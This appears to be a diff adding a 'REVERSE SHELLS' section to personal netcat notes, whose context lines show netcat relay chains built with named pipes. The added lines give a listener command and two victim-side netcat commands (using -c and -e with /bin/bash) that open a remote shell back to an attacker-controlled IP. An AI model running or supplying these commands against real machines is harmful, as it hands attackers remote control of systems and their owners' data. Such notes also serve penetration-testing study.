@@ -101,3 +101,32 @@ nc <box2.1IP> 3333               nc -lvp 3333 < mypipe | nc -lvp 4444 > mypipe  
 nc -lvp 5555               nc <box1IP> 5555 < mypipe | nc -lvp 6666 > mypipe                 nc <box2.2IP> 6666
 
 
+
+
+
+REVERSE SHELLS!!!!!!!!!!!!!!!!!!!!!
+    First listen for the shell on your device.
+ nc -lvp 9999
+
+whichever works on the victim machine:
+    On Victim using -c :   
+ nc -c /bin/bash 10.10.0.40 9999
+
+    On Victim using -e :
+ nc -e /bin/bash 10.10.0.40 9999
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
